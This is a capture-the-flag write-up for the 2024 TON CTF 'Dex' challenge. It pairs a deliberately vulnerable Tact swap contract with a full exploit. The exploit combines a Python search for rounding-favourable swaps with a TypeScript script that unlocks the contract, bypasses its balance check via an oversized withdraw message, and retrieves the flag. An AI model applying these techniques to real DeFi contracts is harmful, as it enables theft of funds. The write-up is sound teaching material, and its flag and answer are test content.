---
title: Blockchain - Dex
description: 2024 | TON CTF
tags:
    - ton
    - tact
    - precision loss
---

## Description

> [Challenge Files](https://github.com/TonBitSec/TonCTF-Challenges/tree/6dc2518086f88006a4dd4dd0bfef963b1f13c33b/dex)

??? note "dex.tact"

    ```rs
    import "@stdlib/deploy";

    message Withdraw {
        value: Int as coins;
    }

    message Swap {
        amount: Int as coins;
        a_b: Int;
    }

    contract Dex with Deployable {

        override const storageReserve: Int = ton("0.1");
        solved: Bool;
        lock: Bool;
        tokena_amount: Int as coins;
        tokenb_amount: Int as coins;
        user_balances: map<Int, Int>;
        user_created: Bool;

        init(ctf: Int) {
            self.solved = false;
            self.lock = true;
            self.user_created = false;
            self.tokena_amount = 10;
            self.tokenb_amount = 10;
        }

        receive("CreateUser"){
            require(!self.user_created, "User created");        
            self.user_balances.set(1, 10);
            self.user_balances.set(2, 0);
            self.user_created = true;
        }

        receive(msg: Swap){
            let ctx: Context = context();
            require(ctx.value>=ton("0.14"),"insufficient pay for gas");
            require(self.user_created, "Not created");   
            let x: Int  = self.tokena_amount;
            let y: Int  = self.tokenb_amount;
            let user_a: Int = self.user_balances.get(1)!!;
            let user_b: Int = self.user_balances.get(2)!!;
            if(msg.a_b == 1){
                require(user_a >= msg.amount, "Insufficient balance");
                let out_amount: Int = y - (x*y)/(x + msg.amount);
                self.user_balances.set(1, user_a - msg.amount);
                self.user_balances.set(2, user_b + out_amount);
                self.tokena_amount = x + msg.amount;
                self.tokenb_amount = y - out_amount;
            }else {
                require(user_b >= msg.amount, "Insufficient balance");
                let out_amount: Int = x - (x*y)/(y + msg.amount);
                self.user_balances.set(1, user_a + out_amount);
                self.user_balances.set(2, user_b - msg.amount);
                self.tokena_amount = x - out_amount;  
                self.tokenb_amount = y + msg.amount;     
            }
            if (self.user_balances.get(1)!! + self.user_balances.get(2)!! == 29){
                self.lock = false;
            }
        }

        receive(msg: Withdraw) {
            require(!self.lock, "locking");
            // Get the current context
            let ctx: Context = context();
            // Require required balance
            require(myBalance() > ton("1.0") + self.storageReserve + msg.value, "Insufficient balance");
            // Withdraw
            send(SendParameters{
                value: msg.value, 
                mode: SendRemainingValue,
                to: ctx.sender, 
                body: "Withdraw сompleted".asComment()
            });
        }    

        receive("Solve"){
            require(!self.lock, "Locking");        
            if (myBalance()<ton("0.5")){
                self.solved = true;
            }
        }

        get fun is_solved(): Bool {
            return self.solved == true;
        }
    }
    ```

## Solution

- We first need to let the sum of the `user_balances` be 29 to set `locked` to `false`. After unlocking, send a `Solve` message when the contract balance is less than 0.5 ton to solve the challenge
- There is a loss of precision when calculating the `out_amount`. So, we may get more tokens after swapping
    - Note that `amount` is serialized as `coins`, which is an alias to `VarUInteger_16`. We can not send a negative value

        ```rs
        message Swap {
            amount: Int as coins;
            a_b: Int;
        }
        ```

- After swapping, the contract balance will be surely above 0.5 ton. Because each swap requires sending at least 0.14 ton, and `locked` can't be set to `false` with just one or two swaps
- We have to bypass the check and withdraw some ton from the contract. `myBalance()` returns the nanoToncoin balance of the smart contract as it was at the start of the **compute phase** of the current transaction. Thus, we can increase the value attached to the withdraw message. Any excess left from the incoming message after all gas costs are deducted from it will be add to the outgoing value because of the send mode `SendRemainingValue`
    - Each transaction consists of up to 5 phases: storage phase, credit phase, compute phase, action phase and bounce phase. In the credit phase, the balance of the contract with respect to a (possible) incoming  message value and collected storage fee are calculated

    ```rs
    receive(msg: Withdraw) {
        require(!self.lock, "locking");
        // Get the current context
        let ctx: Context = context();
        // Require required balance
        require(myBalance() > ton("1.0") + self.storageReserve + msg.value, "Insufficient balance");
        // Withdraw
        send(SendParameters{
            value: msg.value, 
            mode: SendRemainingValue,
            to: ctx.sender, 
            body: "Withdraw сompleted".asComment()
        });
    }
    ```

### Exploitation

Before and after the swap, the sum of `tokena_amount`, `tokenb_amount`, `user_balances(1)` and `user_balances(2)` remains unchanged. So after each swap, we hope that the sum of `user_balances` will increase, or at least the product of `tokena_amount` and `tokenb_amount` will decrease, which may result in a larger `out_amount`.

??? note "swap.py"

    ```py
    def fun(x, y, user_a, user_b, a, f):
        if f == 1:
            out = y - (x * y) // (x + a)
            return user_a - a, user_b + out, x + a, y - out
        else:
            out = x - (x * y) // (y + a)
            return user_a + out, user_b - a, x - out, y + a

    user_a, user_b = 10, 0
    x, y = 10, 10
    cnt = 0

    while user_a + user_b < 29:
        if user_b == 0 or user_a > 0:
            for i in range(user_a, 0, -1):
                ra, rb, rx, ry = fun(x, y, user_a, user_b, i, 1)
                if ra + rb > user_a + user_b or rx * ry < x * y:
                    user_a, user_b, x, y = ra, rb, rx, ry
                    print(f"amount:{i} a_b:{1} user_a:{user_a} user_b:{user_b} x:{x} y:{y}")
                    cnt += 1
                    break
        if user_a == 0:
            for i in range(1, user_b + 1):
                ra, rb, rx, ry = fun(x, y, user_a, user_b, i, 0)
                if ra + rb > user_a + user_b or rx * ry < x * y:
                    user_a, user_b, x, y = ra, rb, rx, ry
                    print(f"amount:{i} a_b:{0} user_a:{user_a} user_b:{user_b} x:{x} y:{y}")
                    cnt += 1
                    break
    print(cnt)
    ```

```ts
import { OpenedContract, Address, toNano, TonClient, WalletContractV4 } from "@ton/ton";
import { mnemonicToPrivateKey } from "ton-crypto";
import { Dex } from "./output/Dex_Dex";
import * as dotenv from "dotenv";
dotenv.config();

async function sleep(wallet_contract: OpenedContract<WalletContractV4>, seq: number) {
    while (true) {
        if (seq < (await wallet_contract.getSeqno())) {
            return wallet_contract.getSeqno();
        }
    }
}

(async () => {
    const client = new TonClient({
        endpoint: "http://65.21.223.95:8081/jsonRPC",
    });

    let mnemonics = (process.env.mnemonics_2 || "").toString();
    console.log(mnemonics);

    let keyPair = await mnemonicToPrivateKey(mnemonics.split(" "));
    let secretKey = keyPair.secretKey;
    let workchain = 0;
    let deployer_wallet = WalletContractV4.create({ workchain, publicKey: keyPair.publicKey });
    console.log(deployer_wallet.address);

    let deployer_wallet_contract = client.open(deployer_wallet);
    console.log("Balance", await deployer_wallet_contract.getBalance());

    let target = Address.parse(CONTRACT);

    let contract_open = await client.open(Dex.fromAddress(target));
    let seqno: number = await deployer_wallet_contract.getSeqno();
    await contract_open.send(
        deployer_wallet_contract.sender(secretKey),
        {
            value: toNano("0.1"),
        },
        "CreateUser"
    );
    seqno = await sleep(deployer_wallet_contract, seqno);
    console.log("User created");
    let l = [[9, 1], [1, 1], [1, 0], [3, 1], [1, 1], [1, 0], [4, 1], [1, 1], [1, 0], [7, 1], [1, 0], [9, 1], [1, 1], [1, 0]];
    for (let i = 0; i < l.length; i++) {
        await contract_open.send(
            deployer_wallet_contract.sender(secretKey),
            {
                value: toNano("0.14"),
            },
            {
                "$$type": "Swap",
                "amount": BigInt(l[i][0]),
                "a_b": BigInt(l[i][1]),
            }
        );
        seqno = await sleep(deployer_wallet_contract, seqno);
        console.log("Sent", i);
    }
    console.log("Swap done");
    await contract_open.send(
        deployer_wallet_contract.sender(secretKey),
        {
            value: toNano("2"),
        },
        {
            "$$type": "Withdraw",
            "value": toNano("1.9"),
        }
    );
    seqno = await sleep(deployer_wallet_contract, seqno);

    await contract_open.send(
        deployer_wallet_contract.sender(secretKey),
        {
            value: toNano("0.01"),
        },
        "Solve"
    );
    await sleep(deployer_wallet_contract, seqno);
    console.log(await contract_open.getIsSolved());
})();
```

### Flag

> flag{yGNp5ttpbLnU}_Dex

## References

- [Variable `coins` type](https://docs.tact-lang.org/book/integers#serialization-coins)
- [Transactions and phases](https://docs.ton.org/learn/tvm-instructions/tvm-overview#transactions-and-phases)
- [myBalance](https://docs.tact-lang.org/ref/core-common/#mybalance)
- [Message mode](https://docs.tact-lang.org/book/message-mode/#_top)
